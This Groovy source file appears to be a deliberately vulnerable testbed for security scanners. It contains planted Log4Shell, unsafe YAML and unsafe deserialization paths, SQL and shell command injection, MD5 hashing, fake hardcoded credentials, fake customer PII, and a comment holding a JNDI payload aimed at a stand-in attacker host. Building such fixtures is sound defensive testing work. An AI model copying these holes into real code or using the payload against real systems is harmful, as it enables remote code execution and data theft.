package com.example

import groovy.transform.CompileStatic
import org.yaml.snakeyaml.Yaml
import com.fasterxml.jackson.databind.ObjectMapper
import org.apache.logging.log4j.LogManager
import org.apache.logging.log4j.Logger

/**
 * Groovy testbed app — REACHABLE testbed
 *
 * CVEs exercised via reachable code paths:
 *   CVE-2021-44228  — Log4Shell (reachable via logUserInput)
 *   CVE-2022-25857  — SnakeYAML DoS (reachable via parseConfig)
 *   CVE-2021-46877  — jackson-databind array wrapper (reachable via deserialize)
 *   CVE-2015-7501   — commons-collections deserialization (reachable via processObject)
 *
 * Hardcoded secrets: AWS keys, DB password, Log4j JNDI test
 */
@CompileStatic
class Application {

    // =========================================================================
    // HARDCODED SECRETS (SECRET signal)
    // =========================================================================
    static final String AWS_ACCESS_KEY_ID     = "AKIAIOSFODNN7GROOVYTEST"
    static final String AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYGROOVYKEY"
    static final String DATABASE_URL          = "postgresql://admin:groovy_prod_P@ss!2026@db.example.com:5432/app"
    static final String STRIPE_KEY            = "sk_live_groovy_FakeKeyForTestingABCDEFGHIJ"
    static final String SLACK_TOKEN           = "xoxb-groovy-test-1234567890-FakeSlackToken"

    private static final Logger log = LogManager.getLogger(Application.class)

    // =========================================================================
    // REACHABLE: CVE-2021-44228 — Log4Shell
    // Logging user-controlled input with Log4j 2.14.1 → JNDI injection
    // =========================================================================
    static String logUserInput(String userInput, String userId) {
        // CVE-2021-44228: If userInput = "${jndi:ldap://attacker.com/a}" → RCE
        // Log4j 2.14.1 performs JNDI lookup on interpolated log message
        log.info("User {} submitted: {}", userId, userInput)
        return "logged"
    }

    // =========================================================================
    // REACHABLE: CVE-2022-25857 — SnakeYAML DoS
    // Parsing user-supplied YAML without SafeConstructor — allows type coercion
    // =========================================================================
    static Object parseConfig(String yamlContent) {
        // CVE-2022-25857: Yaml() without SafeConstructor allows arbitrary Java class instantiation
        // Billion laughs attack exhausts memory
        def yaml = new Yaml()
        return yaml.load(yamlContent)
    }

    // =========================================================================
    // REACHABLE: CVE-2021-46877 — jackson-databind array wrapper DoS
    // =========================================================================
    static Object deserialize(String json) {
        def mapper = new ObjectMapper()
        // CVE-2021-46877: deep array wrapping in JSON causes exponential processing
        return mapper.readValue(json, Object.class)
    }

    // =========================================================================
    // REACHABLE: CWE-089 SQL Injection in Groovy
    // =========================================================================
    static String buildUserQuery(String username) {
        // CWE-089: GString interpolation into SQL — injection vector
        return "SELECT * FROM users WHERE username = '${username}'"
    }

    // =========================================================================
    // REACHABLE: CWE-078 Command Injection via Groovy execute()
    // =========================================================================
    static String runCommand(String userCmd) {
        // CWE-078: Groovy's .execute() on user-controlled string
        // "ls ${userCmd}".execute() — shell injection
        def cmd = "ls ${userCmd}"
        return cmd.execute().text
    }

    // =========================================================================
    // REACHABLE: CWE-327 — Weak crypto
    // =========================================================================
    static String weakHash(String data) {
        // CWE-327: MD5 for sensitive data
        return data.md5()
    }

    // =========================================================================
    // REACHABLE: DLP/PII — hardcoded customer data
    // =========================================================================
    static final List<Map<String, String>> CUSTOMER_DATA = [
        [
            name:    "Carol Anderson",
            email:   "carol.anderson.private@gmail.com",
            ssn:     "345-67-8901",
            phone:   "503-555-2468",
            card:    "4532015112830366",   // Visa Luhn-valid
            address: "321 Pine Avenue, Portland, OR 97201",
        ],
        [
            name:    "David Brown",
            email:   "david.brown.personal@outlook.com",
            ssn:     "456-78-9012",
            phone:   "206-555-1357",
            card:    "5425233430109903",   // Mastercard Luhn-valid
            address: "654 Cedar Road, Seattle, WA 98101",
        ],
    ]

    // =========================================================================
    // DEAD CODE: never called from main — NOT_REACHABLE
    // =========================================================================
    private static String deadCodeCommonsCollections(byte[] serializedData) {
        // CVE-2015-7501: Commons Collections deserialization gadget
        // But this function is never called — NOT_REACHABLE
        def ois = new ObjectInputStream(new ByteArrayInputStream(serializedData))
        return ois.readObject().toString()
    }

    // =========================================================================
    // MAIN
    // =========================================================================
    static void main(String[] args) {
        log.info("Groovy testbed starting")
        println "AWS key: ${AWS_ACCESS_KEY_ID.take(8)}..."

        // Exercise reachable paths
        logUserInput("hello world", "user_123")
        def query = buildUserQuery("alice")
        log.info("Query: {}", query)

        def result = deserialize('{"key": "value"}')
        log.info("Deserialized: {}", result)
    }
}
